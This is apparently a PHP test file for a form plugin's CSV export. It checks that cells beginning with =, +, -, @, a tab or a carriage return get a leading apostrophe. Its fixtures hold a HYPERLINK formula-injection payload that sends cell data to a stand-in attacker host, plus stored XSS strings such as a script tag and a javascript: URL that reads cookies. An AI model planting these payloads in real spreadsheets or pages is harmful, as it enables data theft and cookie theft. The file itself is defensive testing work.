<?php
/**
 * R-2: export cells that would run as spreadsheet formulas get a leading apostrophe.
 */

use WPSB\Forms\HttpCase;
use function WPSB\Forms\form_id;
use function WPSB\Forms\parse_csv;

class CsvFormulaTest extends HttpCase {

	public function test_formula_cells_are_neutralised(): void {
		$res = $this->export( 'admin', array( 'form_id' => form_id( 'contact-us' ) ) );
		$this->assertSame( 200, $res['status'], substr( $res['body'], 0, 300 ) );
		$rows = parse_csv( $res['body'] );
		$this->assertSame( array( 'Submission ID', 'Submitted (UTC)', 'Status', 'Your name', 'E-mail', 'Website', 'Topic', 'Message' ), $rows[0] );
		$this->assertCount( 41, $rows, 'same rows' );
		$by = array_column( array_slice( $rows, 1 ), null, 4 );

		$this->assertSame( '\'=HYPERLINK("http://evil.example/?d="&A1,"Click me")', $by['formula@example.org'][3] );
		$this->assertSame( "'+SUM(1,2)", $by['formula@example.org'][7] );
		$this->assertSame( 'https://formula.example', $by['formula@example.org'][5] );
		$this->assertSame( "'@cmd", $by['formula2@example.org'][3] );
		$this->assertSame( "'-2+3", $by['formula2@example.org'][7] );
		$this->assertSame( "'\tTabbed Name", $by['formula3@example.org'][3] );
		$this->assertSame( "'\rStarts with a carriage return", $by['formula3@example.org'][7] );
		$this->assertSame( 'www.formula3.example', $by['formula3@example.org'][5] );

		// Everything else is unchanged.
		$this->assertSame( 'Visitor 01', $by['visitor01@example.org'][3] );
		$this->assertSame( "Hello, this is question number 01.\nThanks!", $by['visitor01@example.org'][7] );
		$this->assertSame( '<script>alert("acme-xss-1")</script>', $by['mallory@example.org'][3] );
		$this->assertSame( 'javascript:alert(document.cookie)', $by['mallory@example.org'][5] );
		$this->assertMatchesRegularExpression( '/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/', $by['visitor01@example.org'][1] );
		$this->assertStringContainsString( '"\'=HYPERLINK(""http://evil.example/?d=""&A1,""Click me"")"', $res['body'], 'quoted like before' );
	}

	public function test_new_submissions_are_neutralised_too(): void {
		$res = $this->submit_public(
			'contact-us',
			array(
				'name'    => '-Minus Mia',
				'email'   => 'mia@example.org',
				'website' => '',
				'topic'   => 'Press',
				'message' => '=1+1 and @home',
			)
		);
		$this->assertRedirectStatus( $res, 'sent' );
		$res = $this->export( 'erin', array( 'form_id' => form_id( 'contact-us' ), 'from' => gmdate( 'Y-m-d', time() - DAY_IN_SECONDS ) ) );
		$rows = parse_csv( $res['body'] );
		$this->assertCount( 2, $rows );
		$this->assertSame( "'-Minus Mia", $rows[1][3] );
		$this->assertSame( "'=1+1 and @home", $rows[1][7] );
		$this->assertSame( 'mia@example.org', $rows[1][4] );
	}
}
